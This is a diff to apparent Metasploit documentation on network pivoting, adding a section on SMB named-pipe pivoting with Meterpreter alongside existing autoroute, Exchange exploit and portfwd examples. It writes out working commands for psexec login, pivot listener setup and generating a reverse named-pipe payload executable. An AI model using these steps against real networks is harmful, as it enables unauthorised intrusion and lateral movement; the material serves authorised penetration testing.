@@ -1,4 +1,5 @@
-# Overview of Pivoting And Its Benefits
+## Overview
+
 Whilst in test environments one is often looking at flat networks that only have one subnet and one network environment, the reality is that when it comes to pentests that are attempting to compromise an entire company, you will often have to deal with multiple networks, often with switches or firewalls in-between that are intended to keep these networks separate from one another.
 
 In order for pivoting to work, you must have compromised a host that is connected to two or more networks. This usually means that the host has two or more network adapters, whether that be physical network adapters, virtual network adapters, or a combination of both.
@@ -7,11 +8,14 @@ Once you have compromised a host that has multiple network adapters you can then
 
 Now that we understand some of the background, lets see this in action a bit more by setting up a sample environment and walking through some of Metasploit's pivoting features.
 
-# A Quick Note Before Continuing
+## Supported Session Types
+
 Pivoting functionality is provided by all Meterpreter and SSH sessions that occur over TCP channels. Whilst Meterpreter is mentioned below, keep in mind that this would also work with an SSH session as well. We have just resorted to using Meterpreter for this example for demonstration purposes.
 
-# Testing Pivoting
-## Target Environment Setup
+## Testing Pivoting
+
+### Target Environment Setup
+
 - Kali Machine
 	- Internal: None
 	- External: 172.19.182.171
@@ -153,7 +157,7 @@ IPv4 Active Routing Table
 msf6 post(multi/manage/autoroute) >
 ```
 
-# Using the Pivot
+## Using the Pivot
 At this point we can now use the pivot with any Metasploit modules as shown below:
 
 ```
@@ -210,11 +214,42 @@ msf6 exploit(windows/http/exchange_chainedserializationbinder_denylist_typo_rce)
 [*] 169.254.204.110:443 - The target is not exploitable. Exchange Server 15.2.986.14 does not appear to be a vulnerable version!
 msf6 exploit(windows/http/exchange_chainedserializationbinder_denylist_typo_rce) >
 ```
-# Pivoting External Tools
-## portfwd
+
+## SMB Named Pipe Pivoting in Meterpreter
+
+The Windows Meterpreter payload supports lateral movement in a network through SMB Named Pipe Pivoting. No other Meterpreters/session types support this functionality.
+
+First open a Windows Meterpreter session to the pivot machine:
+
+```
+use exploit/windows/smb/psexec
+run smb://admin:password123@169.254.16.221
+```
+
+Create named pipe pivot listener on the pivot machine, setting `-l` to the pivot's bind address:
+
+```
+meterpreter > pivot add -t pipe -l 169.254.16.221 -n msfpipe -a x64 -p windows
+[+] Successfully created pipe pivot.
+meterpreter >
+```
+
+Now generate a separate payload that will connect back through the pivot machine. This payload will be executed on the final target machine:
+
+```
+msf6 > use windows/x64/meterpreter/reverse_named_pipe
+msf6 payload(windows/x64/meterpreter/reverse_named_pipe) > generate -o named_pipe_example.exe -f exe pipehost=169.254.16.221 pipename=msfpipe
+[*] Writing 7168 bytes to named_pipe_example.exe...
+```
+
+After running the payload on the final Windows 2019 target machine a new session will open, via the Windows 11 169.254.16.221 pivot.
+
+## Pivoting External Tools
+
+### portfwd
 *Note: This method is discouraged as you can only set up a mapping between a single port and another target host and port, so using the socks module below is encouraged where possible. Additionally this method has been depreciated for some time now.*
 
-### Local Port Forwarding
+#### Local Port Forwarding
 To set up a port forward using Metasploit, use the `portfwd` command within a supported session's console such as the Meterpreter console. Using `portfwd -h` will bring up a help menu similar to the following:
 
 ```
@@ -262,7 +297,7 @@ Connecting to 127.0.0.1:443... failed: Connection refused.
 
 Note that you may need to edit your `/etc/hosts` file to map IP addresses to given host names to allow things like redirects to redirect to the right hostname or IP address when using this method of pivoting.
 
-### Listing Port Forwards and Removing Entries
+#### Listing Port Forwards and Removing Entries
 Can list port forwards using the `portfwd list` command. To delete all port forwards use `portfwd flush`. Alternatively to selectively delete local port forwarding entries, use `portfwd delete -l <local port>`.
 
 ```
@@ -275,7 +310,7 @@ No port forwards are currently active.
 meterpreter >
 ```
 
-### Remote Port Forwarding
+#### Remote Port Forwarding
 This scenario is a bit different than above. Whereas previously we were instructing the session to forward traffic from our host running Metasploit, through the session, and to a second target host, with reverse port forwarding the scenario is a bit different. In this case we are instructing the session to forward traffic from other hosts through the session, and to our host running Metasploit. This is useful for allowing other applications running within a target network to interact with local applications on the machine running Metasploit.
 
 To set up a reverse port forward, use `portfwd add -R` within a supported session and then specify the `-l`, `-L` and `-p` options. The `-l` option specifies the port to forward the traffic to, the `-L` option specifies the IP address to forward the traffic to, and the `-p` option specifies the port to listen on for traffic on the machine that we have a session on (whose session console we are currently interacting with).
